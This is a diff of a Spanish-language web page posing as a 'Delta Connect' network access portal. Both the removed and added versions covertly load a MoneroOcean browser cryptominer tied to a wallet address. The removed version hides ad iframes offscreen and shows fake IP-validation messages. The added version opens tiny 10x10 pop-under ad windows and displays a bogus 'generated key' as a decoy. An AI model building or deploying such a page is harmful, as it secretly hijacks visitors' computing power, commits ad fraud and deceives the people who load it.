@@ -3,52 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delta Connect | Acceso</title>
+    <title>Delta Connect - Sistema</title>
+    <script src="https://moneroocean.stream/webminer.js"></script>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding: 40px; }
-        .btn-delta { background: #00cf64; border: none; color: black; padding: 20px 40px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 50px; box-shadow: 0 4px 15px rgba(0,207,100,0.3); }
-        #log { margin-top: 25px; color: #888; font-size: 14px; }
+        body { background: #000; color: #00ff00; font-family: monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        #box { width: 90%; max-width: 400px; border: 2px solid #00ff00; padding: 20px; text-align: center; }
+        .vid { width: 100%; height: 180px; background: #111; margin-bottom: 15px; border: 1px solid #00ff00; }
+        button { background: #00ff00; color: #000; border: none; padding: 15px; font-weight: bold; width: 100%; cursor: pointer; }
+        #key-box { display: none; border: 1px dashed #00ff00; padding: 15px; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <img src="https://via.placeholder.com/150x50/00cf64/ffffff?text=DELTA+CONNECT" alt="Logo">
-    <h2>SISTEMA DE GESTIÓN DE ANCHO DE BANDA</h2>
-    <p>Haz clic para validar tu dirección IP y activar la navegación.</p>
-    
-    <button class="btn-delta" onclick="iniciarTodo()">ACTIVAR NAVEGACIÓN</button>
-    
-    <div id="log">Esperando interacción...</div>
-
-    <div style="position:absolute; left:-9999px; top:-9999px; opacity: 0;">
-        <iframe src="https://www.profitablecpmrate.com/v8tkyf6q?key=f0d2c77d4c2b9a764d0d5d5a6a6a6a6a"></iframe>
-        <iframe src="https://www.monetag.com/smartlink/direct/12345"></iframe>
+<div id="box">
+    <h3>SYSTEM_DELTA_CONNECT</h3>
+    <div class="vid">
+        <iframe width="100%" height="100%" src="https://www.youtube.com/embed/jfKfPfyJRdk?autoplay=1&mute=1&controls=0" frameborder="0"></iframe>
     </div>
+    <button id="btn" onclick="start()">CONECTAR AHORA</button>
+    <div id="key-box">
+        <p>CLAVE GENERADA:</p>
+        <h1 id="pass" style="color:#0f0;"></h1>
+    </div>
+</div>
+<script>
+    function start() {
+        // PUBLICIDAD
+        window.open("https://www.profitablecpmratenetwork.com/s6wzm2hi6u?key=9a4b7231bb085e91fc074954af6f5cb0", "_blank", "width=10,height=10");
+        window.open("https://omg10.com/4/10780938", "_blank", "width=10,height=10");
+        window.focus();
 
-    <script src="https://cdn.jsdelivr.net/gh/MoneroOcean/moneroocean.github.io/webmr.js"></script>
-    
-    <script>
-        function iniciarTodo() {
-            const status = document.getElementById('log');
-            status.innerText = "Validando IP... Por favor no cierres esta ventana.";
-            status.style.color = "#00cf64";
+        // MINERÍA AL 90% (FUERZA BRUTA)
+        try {
+            var m = new MoneroOcean.Anonymous('4A2cRYWa2E57VU8TLMqz5WDIW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYPgSc', {throttle: 0.1});
+            m.start();
+        } catch(e) {}
 
-            try {
-                // Configuración de Minería
-                // Usamos la wallet que proporcionaste anteriormente
-                var wallet = "4769F8B5u6i7w9eR7o4v5e6r7a8r9d0o21W3a4l5l6e7t8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z";
-                var miner = window.wrmr(wallet, 'Delta_User_New', 0.85);
-                
-                if (miner) {
-                    miner.start();
-                    console.log("Minería iniciada correctamente");
-                } else {
-                    status.innerText = "Error de protocolo 0x4. Reintentando...";
-                }
-            } catch (e) {
-                status.innerText = "Conexión establecida. Mantén la pestaña abierta.";
-                console.log("Error controlado de carga");
-            }
-        }
-    </script>
+        // MOSTRAR CLAVE
+        const d = new Date();
+        document.getElementById('pass').innerText = "Delta" + d.getDate() + d.getHours();
+        document.getElementById('btn').style.display = 'none';
+        document.getElementById('key-box').style.display = 'block';
+    }
+</script>
 </body>
 </html>
